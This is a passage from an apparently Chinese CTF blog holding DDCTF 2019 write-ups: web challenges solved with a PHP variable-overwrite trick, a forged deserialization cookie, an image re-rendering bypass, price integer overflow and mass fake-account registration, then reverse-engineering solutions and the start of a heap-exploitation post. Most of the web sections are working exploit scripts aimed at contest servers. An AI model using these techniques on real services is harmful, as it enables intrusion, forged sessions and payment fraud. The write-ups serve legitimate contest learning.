denied'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'mean'</span>)   </span><br><span class="line">sqr_diff = calc_diff(mean_d, img_data)</span><br><span class="line">print(<span class="string">'sqr diff ='</span>, sqr_diff)</span><br><span class="line"><span class="keyword">if</span> sqr_diff &lt; <span class="number">0.001</span>:</span><br><span class="line">    print(<span class="string">'access granted, congratulations!'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'access denied'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># min</span></span><br><span class="line"><span class="comment"># sqr diff = 0.0016221320356399412</span></span><br><span class="line"><span class="comment"># access denied</span></span><br><span class="line"><span class="comment"># max</span></span><br><span class="line"><span class="comment"># sqr diff = 0.0013153755213765853</span></span><br><span class="line"><span class="comment"># access denied</span></span><br><span class="line"><span class="comment"># mean</span></span><br><span class="line"><span class="comment"># sqr diff = 0.0010791667492742317</span></span><br><span class="line"><span class="comment"># access denied</span></span><br><span class="line"><span class="comment"># DDCTF&#123;VOICE_ENCODED_CHAL&#125;</span></span><br></pre></td></tr></table></figure><h2><span id="web">Web</span></h2><h3><span id="滴">滴</span></h3><p>发现jpg是flag.jpg的hex再base64两次的结果，泄露完index.php后提示看博客。脑洞太大坑了好久，最后发现是practice.txt.swp文件里有东西。。base64解码提示f1ag!ddctf.php,用f1agconfigddctf.php读源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>附上uid访问/f1ag!ddctf.php拿到flag：DDCTF{436f6e67726174756c6174696f6e73}</p><h3><span id="web签到题">web签到题</span></h3><p>向app/Auth.php接口发送请求修改didictf_username为admin，此时可以看源码发现flag可以通过请求app/session.php得到，漏洞为php反序列化字符串漏洞需要先泄露出key值: post发送请求nickname：%s可以拿到key之后需要通过MD5校验，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://117.51.158.44/app/Session.php"</span></span><br><span class="line">key = <span class="string">'EzblrbNS'</span></span><br><span class="line">Application = <span class="string">'O:11:"Application":1:&#123;s:4:"path";s:21:"....//config/flag.txt";&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enCookie</span><span class="params">()</span>:</span></span><br><span class="line">    hash = hashlib.md5((key + Application).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    rslt = urllib.parse.quote(Application) + hash</span><br><span class="line">    <span class="keyword">return</span> rslt</span><br><span class="line"></span><br><span class="line">cookie = <span class="string">'ddctf_id='</span> + enCookie() + <span class="string">';expires=Thu, 18-Apr-2019 01:33:01 GMT; Max-Age=7200'</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: cookie, <span class="string">'didictf_username'</span>: <span class="string">'admin'</span>&#125;</span><br><span class="line">r = requests.post(url, headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h3><span id="upload-img">Upload-IMG</span></h3><p>很明显的二次渲染绕过问题，在github上找了个二次渲染绕过的php脚本jpg_payload，根据提示多挑几张图不同尺寸的大图先丢给服务器渲染，download下来使用jpg_payload写入提示的code:<code>phpinfo()</code>，再次上传成功绕过二次渲染。[Success]<code>Flag=DDCTF{B3s7_7ry_php1nf0_d35382a128639fad}</code></p><h3><span id="大吉大利今晚吃鸡">大吉大利今晚吃鸡</span></h3><p>chrome f12发现买票价格可以自己控制，尝试大整数溢出。当<code>price=3458764513820540928</code>时可以使用100元进行购票。购票函数如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buyTicket</span><span class="params">(Cookie_str)</span>:</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: Cookie_str&#125;</span><br><span class="line">ticket_price = &#123;<span class="string">'ticket_price'</span>: <span class="string">'3458764513820540928'</span>&#125;</span><br><span class="line">buy_ticket_url = <span class="string">'http://117.51.147.155:5050/ctf/api/buy_ticket'</span></span><br><span class="line">r = requests.get(buy_ticket_url, params = ticket_price, headers = headers)</span><br><span class="line"><span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">200</span> <span class="keyword">and</span> r.json()[<span class="string">'msg'</span>] == <span class="string">'购买门票成功'</span>:</span><br><span class="line"><span class="keyword">return</span> r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>支付：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payTicket</span><span class="params">(Cookie_str, bill_id_str)</span>:</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: Cookie_str&#125;</span><br><span class="line">pay_ticket_url = <span class="string">'http://117.51.147.155:5050/ctf/api/pay_ticket'</span></span><br><span class="line">pay_info = &#123;<span class="string">'bill_id'</span>: bill_id_str&#125;</span><br><span class="line">r = requests.get(pay_ticket_url, params = pay_info, headers = headers)</span><br><span class="line">print(r.json())</span><br><span class="line"><span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">200</span> <span class="keyword">and</span> r.json()[<span class="string">'msg'</span>] == <span class="string">'交易成功'</span>:</span><br><span class="line">id_str = str(r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_id'</span>])</span><br><span class="line">ticket = r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_ticket'</span>]</span><br><span class="line">result = &#123;<span class="string">'id'</span>: id_str, <span class="string">'ticket'</span>: ticket&#125;</span><br><span class="line">enermys.append(result)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>购票成功后发现要移除100选手，而且不能是自己，于是循环注册购票移除</p><p>整个脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">my_cookie = &#123;<span class="string">'Cookie'</span>: <span class="string">'user_name=yjw; REVEL_SESSION=db854a913e6c2730a72c83d5b3503096'</span>&#125;</span><br><span class="line">my_ticket = &#123;<span class="string">'id'</span>: <span class="string">'147'</span>, <span class="string">'ticket'</span>: <span class="string">'4cc522f84f11189d9737ab18fc22fcd0'</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(num)</span>:</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">name_str = <span class="string">'yjw111111111111'</span> + str(num)</span><br><span class="line">register_url = <span class="string">'http://117.51.147.155:5050/ctf/api/register'</span></span><br><span class="line">register_info = &#123;<span class="string">'name'</span>: name_str, <span class="string">'password'</span>: <span class="string">'1234567890'</span>&#125;  </span><br><span class="line">r = requests.get(register_url, params = register_info)</span><br><span class="line"><span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">200</span>:</span><br><span class="line">Cookie = r.headers[<span class="string">'Set-Cookie'</span>]</span><br><span class="line">Cookie = Cookie.split(<span class="string">' '</span>)</span><br><span class="line">Cookie = Cookie[<span class="number">0</span>] + Cookie[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">return</span> Cookie</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"> num+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isLogin</span><span class="params">(Cookie_str)</span>:</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: Cookie_str&#125;</span><br><span class="line">is_login_url = <span class="string">'http://117.51.147.155:5050/ctf/api/is_login'</span></span><br><span class="line">r = requests.get(is_login_url, headers = headers)</span><br><span class="line"><span class="keyword">if</span> r.json()[<span class="string">'msg'</span>] == <span class="string">'您已登陆'</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin</span><span class="params">(name_str)</span>:</span></span><br><span class="line">signin_info = &#123;<span class="string">'name'</span>: name_str, <span class="string">'password'</span>:<span class="string">'1234567890'</span>&#125;</span><br><span class="line">signin_url = <span class="string">'http://117.51.147.155:5050/ctf/api/login'</span></span><br><span class="line">r = requests.get(signin_url, params = signin_info)</span><br><span class="line"><span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">200</span>:</span><br><span class="line">Cookie = r.headers[<span class="string">'Set-Cookie'</span>]</span><br><span class="line">Cookie = Cookie.split(<span class="string">' '</span>)</span><br><span class="line">Cookie = Cookie[<span class="number">0</span>] + Cookie[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">return</span> Cookie</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buyTicket</span><span class="params">(Cookie_str)</span>:</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: Cookie_str&#125;</span><br><span class="line">ticket_price = &#123;<span class="string">'ticket_price'</span>: <span class="string">'3458764513820540928'</span>&#125;</span><br><span class="line">buy_ticket_url = <span class="string">'http://117.51.147.155:5050/ctf/api/buy_ticket'</span></span><br><span class="line">r = requests.get(buy_ticket_url, params = ticket_price, headers = headers)</span><br><span class="line"><span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">200</span> <span class="keyword">and</span> r.json()[<span class="string">'msg'</span>] == <span class="string">'购买门票成功'</span>:</span><br><span class="line"><span class="keyword">return</span> r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payTicket</span><span class="params">(Cookie_str, bill_id_str)</span>:</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: Cookie_str&#125;</span><br><span class="line">pay_ticket_url = <span class="string">'http://117.51.147.155:5050/ctf/api/pay_ticket'</span></span><br><span class="line">pay_info = &#123;<span class="string">'bill_id'</span>: bill_id_str&#125;</span><br><span class="line">r = requests.get(pay_ticket_url, params = pay_info, headers = headers)</span><br><span class="line">print(r.json())</span><br><span class="line"><span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">200</span> <span class="keyword">and</span> r.json()[<span class="string">'msg'</span>] == <span class="string">'交易成功'</span>:</span><br><span class="line">id_str = str(r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_id'</span>])</span><br><span class="line">ticket = r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_ticket'</span>]</span><br><span class="line">result = &#123;<span class="string">'id'</span>: id_str, <span class="string">'ticket'</span>: ticket&#125;</span><br><span class="line">enermys.append(result)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recallBill</span><span class="params">(Cookie_str, bill_id_str)</span>:</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: Cookie_str&#125;</span><br><span class="line">recall_bill_url = <span class="string">'http://117.51.147.155:5050/ctf/api/recall_bill'</span></span><br><span class="line">bill_info = &#123;<span class="string">'bill_id'</span>: bill_id_str&#125;</span><br><span class="line">r = requests.get(recall_bill_url, params = bill_info, headers = headers)</span><br><span class="line"><span class="keyword">if</span> r.json()[<span class="string">'status_code'</span>] == <span class="number">200</span> <span class="keyword">and</span> r.json()[<span class="string">'msg'</span>] == <span class="string">'订单已取消'</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showResult</span><span class="params">(Cookie_str)</span>:</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: Cookie_str&#125;</span><br><span class="line">result_url = <span class="string">'http://117.51.147.155:5050/ctf/api/search_ticket'</span></span><br><span class="line">r = requests.get(result_url, headers = headers)</span><br><span class="line">enermys.append()</span><br><span class="line"></span><br><span class="line">enermys = []</span><br><span class="line">cnt = <span class="number">5</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">cookie = register(num)</span><br><span class="line">print(cookie)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> isLogin(cookie):</span><br><span class="line">signin(cookie)</span><br><span class="line">bill_id = buyTicket(cookie)</span><br><span class="line">print(bill_id)</span><br><span class="line">enermy = payTicket(cookie, bill_id)</span><br><span class="line">print(enermy)</span><br><span class="line">num += <span class="number">1</span></span><br><span class="line">url = <span class="string">'http://117.51.147.155:5050/ctf/api/remove_robot'</span></span><br><span class="line">my_headers = my_cookie</span><br><span class="line">r1 = requests.get(url, headers=my_headers, params=enermy)</span><br><span class="line">print(r1.json())</span><br><span class="line"><span class="keyword">if</span> r1.json()[<span class="string">'data'</span>] != []:</span><br><span class="line">cnt -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> cnt == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(enermys)</span><br></pre></td></tr></table></figure><h3><span id="homebrew_event_loop">homebrew_event_loop</span></h3><p>发现execute_event_loop()函数中可以输入<code>?action:function#;arg1;argn</code>型字符串执行<code>function([arg1,arg2])</code></p><p>构造event链 <code>?action:trigger_event#;action:buy;5#action:get_flag;</code>先买5个在get_flag，此时session[‘log’]中会有flag</p><p>利用flask session至签名不加密的性质，base64解密cookie可以得到flag。脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cut</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str.split(<span class="string">'.'</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(str)</span>:</span></span><br><span class="line">    rslt = str.replace(<span class="string">'-'</span>, <span class="string">'+'</span>).replace(<span class="string">'_'</span>,<span class="string">'/'</span>)</span><br><span class="line">    length = len(rslt)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        rslt += <span class="string">'==='</span></span><br><span class="line">    <span class="keyword">elif</span> length % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        rslt += <span class="string">'=='</span></span><br><span class="line">    <span class="keyword">elif</span> length % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        rslt += <span class="string">'='</span></span><br><span class="line">    <span class="keyword">elif</span> length % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">        rslt = rslt</span><br><span class="line">    rslt = base64.b64decode(rslt)</span><br><span class="line">    rslt = zlib.decompress(rslt)</span><br><span class="line">    print(rslt)</span><br><span class="line">    <span class="keyword">return</span> rslt    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(sys.argv[<span class="number">1</span>])</span><br><span class="line">    json_str = cut(sys.argv[<span class="number">1</span>])</span><br><span class="line">    print(json_str)</span><br><span class="line">    rslt = decode(json_str)</span><br><span class="line">    print(rslt)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2><span id="reverse">Reverse</span></h2><h3><span id="windows1">windows1</span></h3><p>file之后就能看到upx壳，去壳之后丢ida静态分析，很容易看到关键代码是一段查表：</p><p>大致猜出来表的位置在0x403018, 扣出来丢python里，取index使结果为<code>DDCTF{reverseME}</code>，表地址和byte_402FF8的偏移是32, 解出来转ascii得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="number">0x3018</span> - <span class="number">0x2ff8</span></span><br><span class="line">Out[<span class="number">1</span>]: <span class="number">32</span></span><br><span class="line">In [<span class="number">2</span>]: tab = <span class="string">'~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)('</span></span><br><span class="line">In [<span class="number">3</span>]: ans = <span class="string">'DDCTF&#123;reverseME&#125;'</span></span><br><span class="line">In [<span class="number">4</span>]: flag = <span class="string">''</span>.join([ chr(tab.index(s)+<span class="number">32</span>) <span class="keyword">for</span> s <span class="keyword">in</span> ans])</span><br></pre></td></tr></table></figure><h3><span id="windows2">windows2</span></h3><p>先查壳，脱壳后丢进ida</p><p>静态分析代码，输入进过一系列操作要输出<code>reverse+</code>，长度要是偶数</p><p>之后的函数中发现函数有查表 表中每一项异或一个数得到的表恰好是base64加密解密的表</p><p>推测加密函数与base64有关</p><p>进一步分析发现时base64解密函数</p><p>执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b64decode(<span class="string">'reverse+'</span>)</span><br></pre></td></tr></table></figure><p>即可</p><h3><span id="confused">Confused</span></h3><p>使用hopper和ida进行逆向</p><p>先确定长度为开头<code>DDCTF{</code>  中间长度0x12 最后为<code>}</code></p><p>进一步确定中间字符</p><p>发现函数在栈中进行了一个初始化 大概长这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">a = [</span><br><span class="line">    <span class="number">0x65</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x100001995</span>, <span class="comment"># xxxxf3 stop</span></span><br><span class="line">    <span class="number">0xF0</span>,</span><br><span class="line">    <span class="number">0x100001D70</span>,</span><br><span class="line">    <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0x100001a60</span>,</span><br><span class="line">    <span class="number">0xf2</span>,</span><br><span class="line">    <span class="number">0x100001aa0</span>,</span><br><span class="line">    <span class="number">0xf4</span>,</span><br><span class="line">    <span class="number">0x100001cb0</span>,</span><br><span class="line">    <span class="number">0xf5</span>,</span><br><span class="line">    <span class="number">0x100001b10</span>,</span><br><span class="line">    <span class="number">0xf3</span>,</span><br><span class="line">    <span class="number">0x100001b70</span>,</span><br><span class="line">    <span class="number">0xf6</span>,</span><br><span class="line">    <span class="number">0x100001b10</span>,</span><br><span class="line">    <span class="number">0xf7</span>,</span><br><span class="line">    <span class="number">0x100001d30</span>,</span><br><span class="line">    <span class="number">0xf8</span>,</span><br><span class="line">    <span class="number">0x100001c60</span>,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>a[0]的值为每一次应该输入的字符，在接下来的运行中会逐步变化。没运行一轮做一次判断，若不相等跳至fail</p><p>动态调试修改内存就能得到结果了</p><p><code>[0X68, 0X65, 0X6C, 0x6c, 0x6f,0x59, 0x6F, 0x75, 0x47, 0x6F, 0x74, 0x54, 0x68, 0x65, 0x46, 0x6c, 0x61, 0x67]</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用——布局内存任意地址写</title>
      <link href="/2019/04/11/%E5%A0%86%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E5%B8%83%E5%B1%80%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99/"/>
      <url>/2019/04/11/%E5%A0%86%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E5%B8%83%E5%B1%80%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>是之前做pico2018时候遇到的两个有些类似的题目，都是通过漏洞能够控制内存上一部分的值并且能够知道这部分内存的地址。再通过题目给的函数想办法布局成能够write everywhere的样子。记录一下备忘。第一题难点在发现写bss段的时候可以同时改bss段的内容，第二题难在代码有些复杂，最后的布局需要好好思考。<br><a id="more"></a></p></blockquote><h3><span id="cake">cake</span></h3><p>题目是一个蛋糕商店，商店的顾客数是随机增加1，shop变量放在bss段上，整个结构是这样：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shop</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> profit;</span><br><span class="line">    unsinged <span class="keyword">int</span> customer_num;</span><br><span class="line">    cake cakes[<span class="number">16</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cake</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> price;</span><br><span class="line">    <span class="keyword">char</span>* name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>很容易看到可以double free，那么想办法写到bss上很容易，可以想办法让customer_num变成0x21的时候给malloc出来或者是profit为0x21的时候malloc出来. 注意第一个被free的蛋糕price会置0，所以profit置0x21是可行的。两种方法都可以试一下，但是最后发现第二种在最后任意地址写的时候方便很多。这题容易让人想改malloc_hook，但是仔细观察程序之后发现这个难度太大，因为malloc的大小不是可控的。难点在发现写内容的时候可以写到bss段上构造一个NULL然后把bss上布局的free_got里写上system_addr.确实很有趣</p><h4><span id="writeup">writeup</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td 